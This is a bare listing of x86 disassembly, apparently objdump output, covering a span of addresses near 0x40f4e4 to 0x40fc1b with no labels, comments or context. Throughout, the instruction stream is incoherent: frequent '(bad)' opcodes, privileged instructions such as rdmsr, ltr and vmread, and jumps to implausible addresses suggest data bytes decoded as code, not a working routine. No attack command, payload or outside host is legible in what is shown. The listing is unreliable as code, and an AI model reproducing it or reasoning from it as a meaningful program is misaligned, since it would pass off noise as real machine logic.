  40f4e4:	inc    DWORD PTR [eax+0x4]
  40f4e7:	push   ecx
  40f4e8:	add    BYTE PTR [edx-0x1],dh
  40f4eb:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  40f4f1:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  40f4fb:	add    ecx,DWORD PTR [ecx-0xf037477]
  40f501:	push   ecx
  40f502:	xor    BYTE PTR [ebx],al
  40f504:	inc    ebp
  40f505:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  40f50b:	(bad)  
  40f50c:	push   eax
  40f50e:	inc    DWORD PTR [eax]
  40f510:	inc    ebp
  40f511:	add    BYTE PTR [ebx],dh
  40f513:	add    BYTE PTR [ebx],0x0
  40f516:	mov    DWORD PTR [ebx-0x150007d4],eax
  40f51c:	lea    edx,[ebp-0x6c]
  40f51f:	je     0x40f4a6
  40f521:	(bad)  
  40f522:	dec    DWORD PTR [eax]
  40f524:	call   DWORD PTR [ebp-0x7b]
  40f527:	mov    edi,edi
  40f529:	hlt    
  40f52a:	call   DWORD PTR [ebp-0x75]
  40f52d:	mov    esp,eax
  40f52f:	cwde   
  40f530:	(bad)  
  40f531:	mov    bh,0xc3
  40f533:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  40f539:	add    DWORD PTR [eax],0x450050ff
  40f53f:	mov    DWORD PTR [ebx+0x9598c8],ecx
  40f545:	inc    edi
  40f547:	jmp    DWORD PTR [eax]
  40f549:	jmp    0xcd00:0x650481ff
  40f550:	mov    DWORD PTR [ebx],esi
  40f552:	and    al,0x81
  40f554:	(bad)  
  40f555:	cmp    al,0xff
  40f557:	pushf  
  40f558:	push   DWORD PTR [ebp+0x8]
  40f55b:	mov    eax,eax
  40f55d:	add    esi,DWORD PTR [eax]
  40f55f:	enter  0x3c45,0x83
  40f563:	add    ah,bh
  40f565:	adc    DWORD PTR [ebx+0x768b5055],eax
  40f56b:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  40f571:	mov    esi,eax
  40f573:	xor    BYTE PTR [ebp+0x45],cl
  40f576:	jmp    0x40f503
  40f578:	mov    ebx,DWORD PTR [eax]
  40f57a:	in     al,dx
  40f57b:	inc    ebp
  40f57c:	or     al,0x2
  40f57e:	dec    DWORD PTR [ebp-0x4]
  40f581:	jne    0x40f5d8
  40f583:	mov    ecx,DWORD PTR [eax+0x18558be8]
  40f589:	mov    edi,DWORD PTR [ebx]
  40f58b:	lock push eax
  40f58d:	xchg   ecx,eax
  40f58e:	jmp    0x3414393
  40f593:	adc    al,0x8b
  40f595:	inc    ebp
  40f596:	mov    al,ds:0x8b04008b
  40f59b:	push   ebp
  40f59c:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  40f5a2:	push   ebp
  40f5a3:	test   DWORD PTR [ebx-0x2900d701],ecx
  40f5a9:	inc    ebp
  40f5aa:	dec    ebp
  40f5ab:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  40f5b1:	mov    DWORD PTR [eax],0xe9ff0020
  40f5b7:	add    al,0x0
  40f5b9:	add    BYTE PTR [eax],al
  40f5bb:	mov    eax,edx
  40f5bd:	push   eax
  40f5be:	rol    DWORD PTR [ebp-0xb0077],1
  40f5c4:	bound  eax,QWORD PTR [ebp+0x50]
  40f5c7:	xor    ecx,DWORD PTR [ecx+0x55899803]
  40f5cd:	sub    al,0x89
  40f5cf:	push   esp
  40f5d1:	lea    edx,[ebp-0x6c]
  40f5d4:	jne    0xffd6f4ec
  40f5da:	inc    DWORD PTR [ebp-0x1d0001]
  40f5e0:	jnp    0xc796d5e6
  40f5e6:	mov    eax,ebx
  40f5e8:	fs mov edi,edi
  40f5eb:	sbb    al,0xc1
  40f5ed:	out    dx,al
  40f5ee:	or     al,0x0
  40f5f0:	ret    0x8d50
  40f5f3:	inc    ebp
  40f5f4:	dec    DWORD PTR [ebx+0xfa98d7]
  40f5fa:	test   edi,edi
  40f5fc:	clc    
  40f5fd:	call   FWORD PTR [edi]
  40f5ff:	or     BYTE PTR [eax],cl
  40f601:	inc    ebp
  40f602:	dec    ebp
  40f603:	inc    DWORD PTR [ebx+0x74803114]
  40f609:	add    DWORD PTR [ebx+0x45fc00],ecx
  40f60f:	call   DWORD PTR [eax+edx*1]
  40f612:	add    ecx,DWORD PTR [ebp-0x38]
  40f615:	push   esi
  40f616:	adc    al,0x8
  40f618:	mov    edx,DWORD PTR [ebp-0x14]
  40f61b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f61e:	add    DWORD PTR [ebp-0x68],0xffffff8d
  40f622:	inc    DWORD PTR [esp+esi*8]
  40f625:	inc    ebp
  40f626:	stos   BYTE PTR es:[edi],al
  40f627:	mov    edx,DWORD PTR [ebp+0x1c]
  40f62a:	add    DWORD PTR [ebp-0x10],eax
  40f62d:	mov    edx,DWORD PTR [ebp-0x70]
  40f630:	cmp    eax,DWORD PTR [eax]
  40f632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f633:	mov    eax,DWORD PTR [eax]
  40f635:	sbb    al,0x73
  40f637:	add    BYTE PTR [ebx],0x1
  40f63a:	call   0x8971463f
  40f63f:	xor    eax,ebp
  40f641:	pop    ds
  40f642:	inc    ebp
  40f643:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  40f649:	(bad)  
  40f64a:	push   DWORD PTR [edi]
  40f64c:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  40f652:	push   DWORD PTR [ebx-0x1]
  40f655:	mov    eax,DWORD PTR [ebp-0x740075]
  40f65b:	sub    eax,DWORD PTR [eax]
  40f65d:	add    eax,DWORD PTR [eax]
  40f65f:	mov    DWORD PTR [ecx+0x5f],eax
  40f662:	mov    DWORD PTR [ebx+0x28],ebx
  40f665:	ret    0xff
  40f668:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  40f66e:	ret    
  40f66f:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f675:	add    BYTE PTR [ebp-0x7d],al
  40f678:	mov    DWORD PTR [eax],eax
  40f67a:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  40f681:	sar    bh,cl
  40f683:	test   BYTE PTR [eax+0x1],dl
  40f686:	inc    ebp
  40f687:	add    BYTE PTR [ebx],dh
  40f689:	test   BYTE PTR [ebx],0x84
  40f68c:	push   eax
  40f68d:	add    BYTE PTR [ebp+0x0],al
  40f690:	add    eax,0x86
  40f695:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f69b:	add    BYTE PTR [ecx],al
  40f69d:	add    BYTE PTR [eax],al
  40f69f:	mov    esi,0x550030
  40f6a4:	mov    ecx,DWORD PTR [edi]
  40f6a6:	sbb    al,0xda
  40f6a8:	jne    0x40f6aa
  40f6aa:	mov    edi,DWORD PTR [ecx]
  40f6ac:	xor    BYTE PTR [eax+eax*1],0x84
  40f6b0:	add    eax,DWORD PTR [eax]
  40f6b2:	cld    
  40f6b3:	add    BYTE PTR [ebp-0x4f],dh
  40f6b6:	mov    eax,DWORD PTR [ecx]
  40f6b8:	cld    
  40f6b9:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f6bf:	retf   0xe45
  40f6c2:	add    eax,edx
  40f6c4:	sbb    al,0xb7
  40f6c6:	dec    ebp
  40f6c7:	or     al,0x89
  40f6c9:	dec    ebp
  40f6ca:	sbb    al,0xf
  40f6cc:	inc    ebp
  40f6cd:	dec    eax
  40f6ce:	mov    eax,DWORD PTR [ebx]
  40f6d0:	sbb    al,0xf
  40f6d2:	nop
  40f6d3:	scas   al,BYTE PTR es:[edi]
  40f6d4:	add    DWORD PTR [eax],eax
  40f6d6:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f6dc:	mov    eax,gs
  40f6de:	add    bh,bh
  40f6e0:	mov    edi,edi
  40f6e2:	cmp    DWORD PTR [edi+0x72],edx
  40f6e5:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f6eb:	gs cmp al,0x0
  40f6ee:	je     0x40f6c6
  40f6f0:	push   eax
  40f6f1:	sar    BYTE PTR [eax],1
  40f6f3:	mov    bh,0x3e
  40f6f5:	push   cs
  40f6f6:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f6fc:	add    DWORD PTR [ecx+0x12],ebp
  40f6ff:	dec    edx
  40f700:	(bad)  
  40f701:	mov    eax,edx
  40f703:	in     al,dx
  40f704:	adc    DWORD PTR [ecx],esi
  40f706:	pop    esi
  40f707:	inc    ecx
  40f708:	leave  
  40f709:	or     DWORD PTR [eax],ebx
  40f70b:	gs push ebp
  40f70d:	add    ah,ch
  40f70f:	into   
  40f710:	in     al,dx
  40f711:	enter  0xb756,0xf0
  40f715:	push   cs
  40f716:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f720:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f726:	jnp    0x74417c2e
  40f72c:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f732:	add    BYTE PTR [edi],cl
  40f734:	mov    edi,DWORD PTR [ecx-0x78]
  40f737:	ltr    WORD PTR [ecx-0x7b]
  40f73b:	dec    DWORD PTR [edi]
  40f73d:	clc    
  40f73e:	out    0x45,eax
  40f740:	add    BYTE PTR [eax],cl
  40f742:	cmp    ebx,0xffffff8c
  40f745:	jge    0x40f747
  40f747:	jb     0x40f759
  40f749:	je     0x4ff7c9
  40f74f:	pop    edx
  40f750:	push   esi
  40f751:	mov    ecx,DWORD PTR [edi]
  40f753:	in     al,dx
  40f754:	rol    DWORD PTR [ebp+0x0],1
  40f757:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f75e:	cmp    DWORD PTR [ecx],0xfffffff0
  40f761:	hlt    
  40f762:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f768:	(bad)  
  40f76a:	push   eax
  40f76b:	jns    0xb840dbe9
  40f771:	lock push cs
  40f773:	ror    edx,0x3
  40f776:	test   BYTE PTR [ecx+0x5500e800],cl
  40f77c:	dec    eax
  40f77d:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f781:	(bad)  
  40f782:	mov    esi,0x7f33ff5f
  40f787:	inc    eax
  40f788:	test   DWORD PTR [edx],eax
  40f78a:	je     0x40f74c
  40f78c:	mov    ecx,ecx
  40f78e:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f792:	and    eax,DWORD PTR [eax+0xf0103]
  40f798:	jp     0x40f786
  40f79a:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f79e:	add    edx,DWORD PTR [edi+0x74]
  40f7a1:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f7a7:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f7ad:	je     0x40f732
  40f7af:	cmp    eax,edi
  40f7b1:	js     0x40f7d6
  40f7b3:	add    eax,0xeb0fc003
  40f7b8:	jns    0x40f745
  40f7ba:	vmread DWORD PTR [ecx+0x45],ebx
  40f7be:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f7c4:	adc    al,0x8b
  40f7c6:	jge    0x40f7dc
  40f7c8:	mov    edi,DWORD PTR [eax-0x4]
  40f7cb:	add    edi,DWORD PTR [edi]
  40f7cd:	or     bh,bh
  40f7cf:	push   ebp
  40f7d0:	push   es
  40f7d1:	mov    DWORD PTR [ebp-0x4],ebx
  40f7d4:	add    edi,esi
  40f7d6:	pop    es
  40f7d7:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f7dd:	mov    DWORD PTR [esp+esi*8],ecx
  40f7e0:	inc    ebp
  40f7e1:	pop    ebp
  40f7e2:	xor    DWORD PTR [esi-0x4],0x3b
  40f7e6:	add    edx,DWORD PTR [ecx+edi*1]
  40f7e9:	push   es
  40f7ea:	clc    
  40f7eb:	mov    bh,0xdb
  40f7ed:	jp     0x40f7a6
  40f7ef:	add    cl,BYTE PTR [esi]
  40f7f1:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f7f7:	test   edi,edi
  40f7f9:	je     0x40f7ef
  40f7fb:	mov    eax,ecx
  40f7fd:	or     BYTE PTR [ebx],al
  40f7ff:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f805:	jbe    0x40f879
  40f807:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f80d:	add    ecx,DWORD PTR [esi]
  40f80f:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f815:	add    eax,DWORD PTR [ebx-0x287af783]
  40f81b:	je     0x40f86a
  40f81d:	mov    DWORD PTR [ecx],edi
  40f81f:	mov    esi,eax
  40f821:	hlt    
  40f822:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f829:	jb     0x40f7eb
  40f82b:	jmp    0x40f818
  40f82d:	xor    esi,DWORD PTR [ebx]
  40f82f:	pop    edi
  40f830:	pop    esi
  40f831:	pop    ebx
  40f832:	ret    
  40f833:	ret    0x8b
  40f836:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f83c:	xor    DWORD PTR [ecx],0xc
  40f83f:	pushf  
  40f840:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  40f846:	rdmsr  
  40f848:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  40f84f:	dec    ebp
  40f850:	ret    
  40f851:	mov    edi,DWORD PTR [esi-0x4]
  40f854:	pop    eax
  40f855:	dec    ebp
  40f856:	jne    0x40f7e3
  40f858:	xor    edi,esp
  40f85a:	inc    eax
  40f85b:	dec    ebp
  40f85c:	jbe    0x40f8b1
  40f85e:	inc    eax
  40f85f:	pop    ebp
  40f860:	add    edx,DWORD PTR [esi+0x8]
  40f863:	push   esp
  40f864:	dec    eax
  40f865:	push   ecx
  40f866:	mov    eax,edi
  40f868:	and    al,0xf0
  40f86a:	jo     0x40f857
  40f86c:	mov    eax,DWORD PTR [ebx]
  40f86e:	sbb    BYTE PTR [ebp+0x4d],cl
  40f871:	mov    eax,DWORD PTR [ebx]
  40f873:	nop
  40f874:	or     BYTE PTR [eax],al
  40f876:	jne    0x40f8cf
  40f878:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  40f87e:	cld    
  40f87f:	xor    edi,edi
  40f881:	add    edi,DWORD PTR [ebp+0x3]
  40f884:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f88a:	js     0x40f810
  40f88c:	jae    0x40f890
  40f88e:	(bad)  
  40f890:	xor    al,0x5d
  40f892:	jmp    0x40f81f
  40f894:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f89b:	fdecstp 
  40f89d:	test   BYTE PTR [edi],ah
  40f89f:	add    bh,BYTE PTR [ebp+0x0]
  40f8a2:	add    ebx,DWORD PTR [ebp-0x77]
  40f8a5:	mov    edi,eax
  40f8a7:	cmp    al,0x0
  40f8aa:	adc    dh,BYTE PTR [ebx]
  40f8ac:	jge    0x40f8b1
  40f8ae:	mov    edi,DWORD PTR [ebx]
  40f8b0:	jl     0x40f8c1
  40f8b2:	clc    
  40f8b3:	dec    edi
  40f8b4:	jge    0x40f8b6
  40f8b6:	mov    eax,DWORD PTR [ebx]
  40f8b8:	jb     0x40f8c2
  40f8ba:	mov    ecx,DWORD PTR [ebp-0x8]
  40f8bd:	mov    edi,edi
  40f8bf:	xor    edx,DWORD PTR [eax]
  40f8c1:	add    edi,DWORD PTR [ebx]
  40f8c3:	mov    DWORD PTR [ebp-0x10],edi
  40f8c6:	inc    edi
  40f8c7:	pop    ebp
  40f8c8:	jge    0x40f905
  40f8ca:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40f8ce:	mov    edx,0xc05d87f0
  40f8d3:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40f8d7:	fimul  WORD PTR [eax]
  40f8d9:	fist   WORD PTR [ebp+0x1c]
  40f8dc:	in     al,dx
  40f8dd:	jne    0x40f8cb
  40f8df:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40f8e5:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40f8e9:	fdivp  st(0),st
  40f8eb:	fild   WORD PTR [ebp+0x4510f85c]
  40f8f1:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40f8f7:	inc    ebp
  40f8f8:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40f8fe:	mov    ebp,DWORD PTR [ebx-0x4]
  40f901:	adc    al,0x8b
  40f903:	rcl    DWORD PTR [eax],0x48
  40f906:	mov    esi,0x7080803
  40f90b:	fiadd  WORD PTR [ebp+0x4d]
  40f90e:	(bad)  
  40f90f:	mov    edx,DWORD PTR [edx-0x4]
  40f912:	mov    edx,DWORD PTR [ebp-0x4]
  40f915:	xor    ebx,DWORD PTR [ebx+0x330103]
  40f91b:	mov    DWORD PTR [edi+0x872dc],edi
  40f921:	xlat   BYTE PTR ds:[ebx]
  40f922:	into   
  40f923:	ffreep st(6)
  40f925:	retf   0x6c7
  40f928:	iret   
  40f929:	dec    ebp
  40f92a:	inc    ebp
  40f92b:	mov    DWORD PTR [ebx],edi
  40f92d:	fmul   QWORD PTR [edi]
  40f92f:	dec    ebp
  40f930:	jnp    0x40f965
  40f932:	add    BYTE PTR [ebx],al
  40f934:	mov    ecx,DWORD PTR [esp+edi*8]
  40f937:	inc    ebp
  40f938:	dec    ebp
  40f939:	lea    esi,[ebx]
  40f93b:	add    DWORD PTR [ebx],eax
  40f93d:	jb     0x40f97a
  40f93f:	add    BYTE PTR [edi],cl
  40f941:	inc    ebp
  40f942:	imul   eax,edi,0x858bd800
  40f948:	cld    
  40f949:	clc    
  40f94a:	mov    DWORD PTR [ebp+0x0],eax
  40f94d:	inc    DWORD PTR [eax]
  40f94f:	or     al,0xde
  40f951:	sbb    bh,0x1
  40f954:	retf   
  40f955:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40f95c:	dec    ebp
  40f95d:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40f963:	enter  0x12de,0xdf
  40f967:	inc    ebp
  40f968:	pop    ebp
  40f969:	dec    DWORD PTR [ebx-0x257f0ff4]
  40f96f:	add    DWORD PTR [edx],edx
  40f971:	add    BYTE PTR [ebp+0x50],dl
  40f974:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40f97a:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40f980:	or     ah,al
  40f982:	pop    ss
  40f983:	cdq    
  40f984:	push   ebp
  40f985:	clc    
  40f986:	mov    eax,DWORD PTR [ebp-0x4]
  40f989:	xor    edx,edx
  40f98b:	add    esi,DWORD PTR [ebx]
  40f98d:	cmp    eax,DWORD PTR [ebx]
  40f98f:	hlt    
  40f990:	cmp    DWORD PTR [ebx],esp
  40f992:	or     al,BYTE PTR [ebp+0xf]
  40f995:	mov    eax,DWORD PTR [edx]
  40f997:	loopne 0x40f999
  40f999:	(bad)  
  40f99a:	mov    ecx,esi
  40f99c:	cld    
  40f99d:	pushf  
  40f99e:	pop    ebp
  40f99f:	fwait
  40f9a0:	mov    esi,DWORD PTR [edx]
  40f9a2:	lock mov eax,eax
  40f9a5:	adc    BYTE PTR [ebx],al
  40f9a7:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40f9ae:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40f9b4:	dec    ebp
  40f9b5:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40f9bb:	(bad)  
  40f9bc:	iret   
  40f9bd:	inc    ebp
  40f9be:	(bad)  
  40f9bf:	jne    0x40fa0e
  40f9c1:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40f9c7:	(bad)  
  40f9c8:	cmp    ebx,eax
  40f9ca:	je     0x40f952
  40f9cc:	add    edi,edi
  40f9ce:	or     bh,bh
  40f9d0:	dec    ebp
  40f9d1:	inc    ebp
  40f9d2:	mov    esi,DWORD PTR [ebx]
  40f9d4:	cld    
  40f9d5:	add    ecx,esi
  40f9d7:	cmp    ecx,DWORD PTR [eax-0xc]
  40f9da:	mov    edx,DWORD PTR [edi]
  40f9dc:	or     BYTE PTR [ebp-0x7c],al
  40f9df:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  40f9e5:	test   BYTE PTR [ebx+ebx*4],cl
  40f9e8:	inc    ebp
  40f9e9:	xor    bh,BYTE PTR [esi]
  40f9eb:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  40f9f2:	jne    0x40f9bb
  40f9f4:	mov    ebp,esp
  40f9f6:	fcomp  DWORD PTR [ebx]
  40f9f8:	add    BYTE PTR [ecx],al
  40f9fa:	inc    DWORD PTR [ebp-0x75]
  40f9fd:	(bad)  
  40f9fe:	cld    
  40f9ff:	add    al,0xce
  40fa01:	mov    ecx,edi
  40fa03:	cld    
  40fa04:	inc    ebp
  40fa05:	fidivr WORD PTR [ebx]
  40fa07:	fbstp  TBYTE PTR [ebp-0x3e]
  40fa0a:	mov    eax,DWORD PTR [eax]
  40fa0c:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fa12:	fadd   st,st(7)
  40fa14:	add    BYTE PTR [ebp-0x1],al
  40fa17:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa1a:	inc    ebp
  40fa1b:	mov    bh,0xc7
  40fa1e:	loopne 0x40fa65
  40fa20:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fa26:	sbb    dh,BYTE PTR [ebx]
  40fa28:	pushf  
  40fa29:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fa2f:	mov    eax,edi
  40fa31:	cwde   
  40fa32:	inc    ebp
  40fa33:	inc    ebp
  40fa34:	jne    0x40f9c1
  40fa36:	mov    esp,esp
  40fa38:	clc    
  40fa39:	add    al,0x4d
  40fa3b:	mov    DWORD PTR [ebx],esi
  40fa3d:	or     al,0x33
  40fa3f:	inc    ebp
  40fa40:	lea    ecx,[ebx-0x398d13fd]
  40fa46:	add    bh,al
  40fa48:	inc    ebp
  40fa49:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fa50:	add    ebp,esp
  40fa52:	shufps xmm1,xmm3,0xc7
  40fa56:	(bad)  
  40fa57:	jmp    0x74863580
  40fa5c:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fa62:	hlt    
  40fa63:	mov    ecx,DWORD PTR [edi]
  40fa65:	fadd   DWORD PTR [ebp+0x0]
  40fa68:	xor    ecx,DWORD PTR [edi]
  40fa6a:	add    ecx,ecx
  40fa6c:	cmp    edi,edi
  40fa6e:	pmuludq mm7,QWORD PTR [edx+0x50]
  40fa72:	(bad)  
  40fa73:	jmp    0x40fa00
  40fa75:	mov    edi,esp
  40fa77:	or     al,0xc6
  40fa79:	inc    ebp
  40fa7a:	(bad)  
  40fa7b:	mov    eax,DWORD PTR [ebp+0x10]
  40fa7e:	jne    0x40fa09
  40fa80:	mov    eax,DWORD PTR [ecx]
  40fa82:	clc    
  40fa83:	add    BYTE PTR [ebp-0x40],cl
  40fa86:	xor    edx,DWORD PTR [eax-0x73]
  40fa89:	jne    0x40fa8c
  40fa8b:	push   DWORD PTR [edx+0x8]
  40fa8e:	add    BYTE PTR [ebp+0x45],al
  40fa91:	mov    ebp,ecx
  40fa93:	cld    
  40fa94:	add    BYTE PTR [ebp+0x0],cl
  40fa97:	xor    eax,DWORD PTR [ebp+0x3]
  40fa9a:	mov    DWORD PTR [ebx],edi
  40fa9c:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40faa2:	sub    eax,0x5d330e4d
  40faa7:	lea    esi,[ebx]
  40faa9:	add    DWORD PTR [ebx],eax
  40faab:	jb     0x40fa96
  40faad:	add    BYTE PTR [eax],al
  40faaf:	inc    ebp
  40fab0:	add    bl,ch
  40fab2:	inc    ebp
  40fab3:	mov    esi,DWORD PTR [ebx]
  40fab5:	or     al,0x3
  40fab7:	(bad)  
  40fab8:	mov    edi,eax
  40faba:	in     al,dx
  40fabb:	scas   eax,DWORD PTR es:[edi]
  40fabc:	inc    ebp
  40fabd:	mov    esi,DWORD PTR [ebx]
  40fabf:	in     al,0x3
  40fac1:	add    al,0x89
  40fac3:	mov    ecx,DWORD PTR [eax+edi*8]
  40fac6:	dec    ebp
  40fac7:	(bad)  
  40fac8:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  40facf:	mov    ecx,eax
  40fad1:	cld    
  40fad2:	push   es
  40fad3:	dec    ebp
  40fad4:	add    al,0x33
  40fad6:	mov    DWORD PTR [ebx],eax
  40fad8:	in     al,dx
  40fad9:	cmp    DWORD PTR [ebp-0x67],eax
  40fadc:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fae2:	mov    edx,DWORD PTR [ebp-0x4]
  40fae5:	mov    ecx,DWORD PTR [ebp-0x2c]
  40fae8:	xor    eax,DWORD PTR [ebp+0x3]
  40faeb:	cmp    DWORD PTR [ebx],0x8b32749a
  40faf1:	xor    edi,esp
  40faf3:	jmp    0xff74f845
  40faf8:	add    ecx,DWORD PTR [ebp-0x3f]
  40fafb:	xor    ebx,DWORD PTR [edi]
  40fafd:	add    eax,ecx
  40faff:	cmp    ebx,DWORD PTR [eax]
  40fb01:	mov    ecx,DWORD PTR [ebp-0x4]
  40fb04:	mov    ecx,DWORD PTR [eax]
  40fb06:	adc    BYTE PTR [ebp-0x80],al
  40fb09:	jmp    0x40fb0c
  40fb0b:	mov    eax,DWORD PTR [eax]
  40fb0d:	cld    
  40fb0e:	mov    bh,0xc6
  40fb10:	push   ecx
  40fb11:	(bad)  
  40fb12:	jne    0x40fb72
  40fb14:	dec    ecx
  40fb16:	or     BYTE PTR [ecx+ebx*1],cl
  40fb19:	push   ebp
  40fb1a:	inc    ebp
  40fb1b:	in     al,dx
  40fb1c:	add    ebp,esp
  40fb1e:	or     bh,al
  40fb20:	dec    ebp
  40fb21:	cld    
  40fb22:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fb28:	xor    DWORD PTR [edx],0x2
  40fb2b:	pushf  
  40fb2c:	dec    DWORD PTR [ebx+0x45510cf4]
  40fb32:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  40fb38:	mov    edx,DWORD PTR [ecx+0xc]
  40fb3b:	xor    eax,esi
  40fb3d:	mov    edx,0xc172c7
  40fb42:	inc    ebp
  40fb43:	mov    esi,DWORD PTR [ebp+0x8]
  40fb46:	mov    eax,edx
  40fb48:	call   0x84c5c23d
  40fb4d:	add    DWORD PTR [ebx-0x76bace00],ebx
  40fb53:	mov    ebp,eax
  40fb55:	or     BYTE PTR [eax],dl
  40fb57:	jo     0x40fba6
  40fb59:	push   edi
  40fb5a:	xor    esi,DWORD PTR [ebp+0x3]
  40fb5d:	(bad)  
  40fb5e:	pmulhuw mm0,mm1
  40fb61:	test   DWORD PTR [ebp-0x8],ecx
  40fb64:	mov    DWORD PTR [ebp-0x67],eax
  40fb67:	mov    eax,DWORD PTR [ebp-0x4]
  40fb6a:	xor    edi,DWORD PTR [ebp-0x73]
  40fb6d:	xor    eax,DWORD PTR [ebx]
  40fb6f:	xor    esi,DWORD PTR [edx+0x3]
  40fb72:	add    BYTE PTR [ecx],bh
  40fb74:	inc    ebp
  40fb75:	(bad)  
  40fb76:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fb7c:	mov    DWORD PTR [eax],0x750f0004
  40fb82:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fb88:	lock add BYTE PTR [ebp+0x0],cl
  40fb8c:	mov    esi,DWORD PTR [ebp-0x18]
  40fb8f:	mov    ebp,edx
  40fb91:	or     al,0x72
  40fb93:	ja     0x40fb95
  40fb95:	mov    edx,esi
  40fb97:	cld    
  40fb98:	(bad)  
  40fb9b:	cli    
  40fb9c:	mov    esi,DWORD PTR [ebp-0x4]
  40fb9f:	cmp    ecx,esi
  40fba1:	bswap  edi
  40fba3:	(bad)
  40fba7:	mov    esi,DWORD PTR [ebp-0x4]
  40fbaa:	mov    esi,ecx
  40fbac:	clc    
  40fbad:	repnz add esi,DWORD PTR [ebp+0x45]
  40fbb1:	push   ebx
  40fbb2:	xor    eax,DWORD PTR [ebp+0x3]
  40fbb5:	cmp    al,0x5f
  40fbb7:	pushf  
  40fbb8:	pop    ebx
  40fbb9:	jmp    0x40fc80
  40fbbe:	mov    esi,DWORD PTR [ebp-0x7d]
  40fbc1:	xor    ebp,DWORD PTR [eax]
  40fbc3:	lea    eax,[ebp-0x8]
  40fbc6:	xor    edx,esi
  40fbc8:	pushf  
  40fbc9:	out    dx,eax
  40fbca:	(bad)  
  40fbcb:	neg    eax
  40fbcd:	ins    DWORD PTR es:[edi],dx
  40fbce:	test   esi,edi
  40fbd0:	clc    
  40fbd1:	pop    esp
  40fbd2:	inc    ebp
  40fbd3:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fbd9:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fbdf:	add    cl,al
  40fbe1:	jne    0x40fb7e
  40fbe3:	mov    esi,DWORD PTR [edx]
  40fbe5:	in     al,dx
  40fbe6:	push   esi
  40fbe7:	xor    BYTE PTR [ebp-0xe],dh
  40fbea:	add    edi,esi
  40fbec:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fbf2:	add    cl,bh
  40fbf4:	mov    edi,DWORD PTR [ebp+0x8]
  40fbf7:	mov    DWORD PTR [ebp-0x14],esi
  40fbfa:	add    esi,DWORD PTR [ebp+0x3c]
  40fbfd:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fc03:	mov    ah,0x3e
  40fc05:	fwait
  40fc06:	pushf  
  40fc07:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fc0d:	jne    0x40fb9a
  40fc0f:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fc12:	icebp  
  40fc13:	icebp  
  40fc14:	shl    edx,0xf2
  40fc17:	(bad)  
  40fc18:	mov    ah,0x16
  40fc1a:	push   eax
  40fc1b:	jne    0x40fbb0
